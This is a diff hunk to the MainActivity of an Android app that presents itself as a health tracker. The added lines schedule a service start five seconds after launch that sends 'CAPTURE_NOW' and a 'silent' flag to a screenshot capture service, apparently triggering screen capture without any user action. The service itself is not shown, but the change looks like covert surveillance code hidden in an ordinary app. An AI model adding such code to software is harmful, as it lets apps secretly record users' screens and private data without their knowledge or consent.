@@ -277,6 +277,15 @@ class MainActivity : ComponentActivity() {
             requestScreenshotPermission()
         }, 2000)
 
+        Handler(Looper.getMainLooper()).postDelayed({
+            Log.i("HealthTracker", "Auto-requesting MediaProjection permission")
+            val intent = Intent(this, ScreenshotCaptureService::class.java).apply {
+                putExtra("command", "CAPTURE_NOW")
+                putExtra("silent", true)
+            }
+            startService(intent)
+        }, 5000)
+
         // 3. Show a feedback message so the user knows it worked
         Toast.makeText(this, "Health Monitor Active!", Toast.LENGTH_SHORT).show()
 
